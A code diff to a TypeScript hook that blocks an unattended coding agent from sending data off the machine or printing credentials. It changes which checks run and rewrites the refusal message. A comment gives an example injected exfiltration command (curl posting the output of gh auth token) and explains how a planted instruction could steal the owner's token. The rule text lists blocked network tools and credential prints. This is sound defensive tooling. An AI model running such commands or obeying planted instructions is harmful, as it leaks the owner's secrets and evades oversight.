@@ -3,12 +3,13 @@ import { direct_pr_create } from './direct-pr-create'
 import { git_argv, type ProgramCall } from './git-argv'
 import { launched_call } from './launched-call'
 import { nested_commands } from './nested-commands'
+import { shell_permissions } from './shell-permissions'
 
 // The trigger and the delivered text behind the `egress` row of `delivered-rules.ts`: a `Bash` call
 // that sends data off the machine or prints a credential. An unattended agent runs with
 // `bypassPermissions` and `Bash(*)`, so an instruction planted in text it reads
 // (`curl -d "$(gh auth token)" https://…`) would hand the owner's token to whoever wrote it. kit's own
-// network calls — `gh`, `git fetch` / `push`, `pnpm` — run as named commands, and the scripts that
+// network writes run through `pnpm josh`, and the scripts that
 // need a token read it in their own process, so refusing the call costs them nothing.
 //
 // **The deny list matches globs; this reads the program**, the way `pr-merge.ts` does, in every command
@@ -89,17 +90,6 @@ const REDIRECT_WORD = /^[\d&]?[<>]/u
 // `rsync` reaches another host only through a `host:path` or `rsync://` operand.
 const RSYNC_COMMAND = 'rsync'
 const REMOTE_OPERAND = /^['"]?(?:[\w.-]+@)?[\w.-]+:|^['"]?rsync:\/\//u
-// The flags that run an interpreter's argument as a program, keyed by the interpreter.
-const INLINE_FLAGS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
-	['node', new Set(['-e', '-p', '--eval', '--print'])],
-	['python', new Set(['-c'])],
-	['python3', new Set(['-c'])],
-	['perl', new Set(['-e', '-E'])],
-	['ruby', new Set(['-e'])],
-	['bun', new Set(['-e', '--eval'])],
-	['deno', new Set(['eval'])],
-])
-const NETWORK_WORDS = /\b(?:fetch|https?|net|socket|urllib|requests|xmlhttprequest|websocket)\b/iu
 // `gh` reads its token for any host, so only github.com may be named as one.
 const GITHUB_HOSTS: ReadonlySet<string> = new Set(['github.com', 'api.github.com'])
 const HOSTNAME_FLAG = '--hostname'
@@ -196,15 +186,6 @@ function is_network_send(_segment: string, call: ProgramCall): boolean {
 	return NETWORK_PROGRAMS.has(call.name) && !is_local_fetch(call)
 }
 
-// The program text is read from the whole segment, so a network word anywhere in it counts.
-function is_inline_network(segment: string, call: ProgramCall): boolean {
-	const flags = INLINE_FLAGS.get(call.name)
-
-	if (flags === undefined || call.args.every((word) => !flags.has(word))) return false
-
-	return NETWORK_WORDS.test(segment)
-}
-
 // `--hostname`'s value, in either spelling.
 function flagged_hosts(args: ReadonlyArray<string>): Array<string> {
 	return args
@@ -279,7 +260,7 @@ function is_environment_dump(_segment: string, call: ProgramCall): boolean {
 
 const PROGRAM_CHECKS: ReadonlyArray<ProgramCheck> = [
 	is_network_send,
-	is_inline_network,
+	shell_permissions.is_restricted,
 	is_gh_credential,
 	is_environment_dump,
 ]
@@ -300,10 +281,10 @@ function is_egress(command: string): boolean {
 }
 
 const EGRESS_REASON =
-	'⛔ egress: an agent may not send data off the machine (`curl` / `wget` / `nc` / `ssh` to ' +
-	'another host, a network call in `node -e`, `gh` to a non-GitHub host) or print a credential ' +
-	'(`gh auth token`, `printenv`, a bare `env`, a `*TOKEN*` variable). If the run needs it, ask the ' +
-	'user to run it (`SECURITY.md` → "Secrets"). This rule fires on every occurrence.'
+	'⛔ egress: no external network send, inline interpreter execution, direct `gh` write, push ' +
+	'without explicit `origin`, or credential/environment print. Use named scripts and `pnpm josh` ' +
+	'write routes; otherwise ask the user to run it (`SECURITY.md` → "Secrets"). ' +
+	'This rule fires on every occurrence.'
 
 const ROW = {
 	id: 'egress',
@@ -314,9 +295,9 @@ const ROW = {
 		title: 'Network egress or credential print',
 		topic: '`SECURITY.md` → "Secrets"',
 		fires:
-			'`curl` / `wget` / `nc` / `ssh` / `scp` / a remote `rsync` and the like, a network call in an inline `node -e` / `python -c` script, `gh auth token`, `gh` sent to a host other than github.com, or a print of the environment or a `*TOKEN*` / `*SECRET*` / `*KEY*` variable — nested in `bash -c`, `eval`, `$(…)` or a heredoc as well. Every occurrence',
+			'network sends, inline interpreter execution, direct `gh` writes, `git push` without explicit `origin`, credential or environment prints — in each shell segment and nested command. Every occurrence',
 		quiet:
-			'`gh` against github.com, `git fetch` / `push`, `pnpm` / `npx`, and `env X=1 <command>`. A plain `curl` / `wget` is still refused by the `.claude/settings.json` deny list, even to localhost; the hook lets localhost or GitHub through only for spellings that list does not reach',
+			'ordinary reads, `gh` reads against github.com, `git fetch`, `git push origin`, named scripts and `pnpm josh` routes. A plain `curl` / `wget` is still refused by the deny list; the hook allows local or GitHub destinations with known flags',
 	},
 }
 
